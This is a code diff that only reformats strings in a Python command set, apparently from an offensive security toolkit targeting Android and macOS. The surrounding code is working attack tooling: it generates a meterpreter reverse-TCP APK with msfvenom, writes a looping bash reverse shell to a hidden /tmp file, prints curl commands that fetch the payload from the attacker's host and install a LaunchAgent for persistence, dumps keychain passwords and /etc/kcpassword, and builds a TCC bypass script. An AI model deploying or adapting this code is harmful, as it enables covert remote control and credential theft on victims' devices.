@@ -128,7 +128,7 @@ class MobileMacOSCommandSet(LazyOwnCommandSet):
                 full_cmd = f"{adb} {cmd}"
                 try:
                     result = subprocess.run(full_cmd, shell=True, timeout=15, capture_output=True, text=True)
-                    out.write(f"\n{'='*60}\n{name}\n{'='*60}\n")
+                    out.write(f"\n{'=' * 60}\n{name}\n{'=' * 60}\n")
                     out.write(result.stdout)
                     out.write(result.stderr if result.stderr else "")
                 except (subprocess.TimeoutExpired, FileNotFoundError) as e:
@@ -174,17 +174,14 @@ class MobileMacOSCommandSet(LazyOwnCommandSet):
             print_error("msfvenom required. Install metasploit-framework.")
             return
 
-        cmd = (
-            f"msfvenom -p android/meterpreter/reverse_tcp "
-            f"LHOST={lhost} LPORT={lport} -o {output}"
-        )
+        cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {output}"
         print_msg(f"Generating APK: {cmd}")
         try:
             result = subprocess.run(cmd, shell=True, timeout=60, capture_output=True, text=True)
             if os.path.exists(output):
                 print_msg(f"APK generated: {output} ({os.path.getsize(output)} bytes)")
                 print_msg(f"Deploy via ADB: adb install {output}")
-                print_msg(f"Or host it: python3 -m http.server 8080")
+                print_msg("Or host it: python3 -m http.server 8080")
             else:
                 print_error(f"APK generation failed: {result.stderr}")
         except FileNotFoundError:
@@ -209,11 +206,7 @@ class MobileMacOSCommandSet(LazyOwnCommandSet):
             return
 
         payload = (
-            f"#!/bin/bash\n"
-            f"while true; do\n"
-            f"  bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 2>/dev/null\n"
-            f"  sleep 60\n"
-            f"done"
+            f"#!/bin/bash\nwhile true; do\n  bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 2>/dev/null\n  sleep 60\ndone"
         )
 
         payload_path = f"/tmp/.{label}"
@@ -239,14 +232,16 @@ class MobileMacOSCommandSet(LazyOwnCommandSet):
             f.write(plist_content)
 
         print_msg("Run these commands on the macOS target:")
-        print_msg(f"  1. Upload and execute payload:")
-        print_msg(f"     curl -o {payload_path} http://{lhost}:8080/.{label} && chmod +x {payload_path} && nohup {payload_path} &")
-        print_msg(f"  2. Install LaunchAgent:")
+        print_msg("  1. Upload and execute payload:")
+        print_msg(
+            f"     curl -o {payload_path} http://{lhost}:8080/.{label} && chmod +x {payload_path} && nohup {payload_path} &"
+        )
+        print_msg("  2. Install LaunchAgent:")
         print_msg(f"     curl -o {launch_agents_path} http://{lhost}:8080/{plist_name}")
         print_msg(f"     launchctl load {launch_agents_path}")
-        print_msg(f"")
+        print_msg("")
         print_msg(f"Files generated in {output_dir}/")
-        print_msg(f"Start HTTP server: python3 -m http.server 8080")
+        print_msg("Start HTTP server: python3 -m http.server 8080")
 
     @cmd2.with_category(MOBILE_CATEGORY)
     def do_macos_keychain(self, line):
@@ -267,7 +262,7 @@ class MobileMacOSCommandSet(LazyOwnCommandSet):
             "security find-generic-password -wa 2>/dev/null",
             "security find-internet-password -wa 2>/dev/null",
             "security find-identity -v -p codesigning 2>/dev/null",
-            'defaults read /Library/Preferences/com.apple.wifi.plist 2>/dev/null',
+            "defaults read /Library/Preferences/com.apple.wifi.plist 2>/dev/null",
             "cat /etc/kcpassword 2>/dev/null | xxd",
         ]
 
@@ -312,7 +307,7 @@ class MobileMacOSCommandSet(LazyOwnCommandSet):
         os.chmod(output_path, 0o755)
 
         print_msg(f"Generated TCC bypass script: {output_path}")
-        print_msg(f"Requirements: Full Disk Access or SIP disabled")
+        print_msg("Requirements: Full Disk Access or SIP disabled")
         print_msg(f"Usage on target: sudo bash {output_path}")
 
 
@@ -334,10 +329,7 @@ def _adb_base(serial: str | None) -> str:
 
 def is_binary_present(name: str) -> bool:
     """Check if a binary is available on PATH."""
-    return any(
-        os.path.exists(os.path.join(p, name))
-        for p in os.environ.get("PATH", "").split(os.pathsep)
-    )
+    return any(os.path.exists(os.path.join(p, name)) for p in os.environ.get("PATH", "").split(os.pathsep))
 
 
 __all__ = ["MobileMacOSCommandSet"]
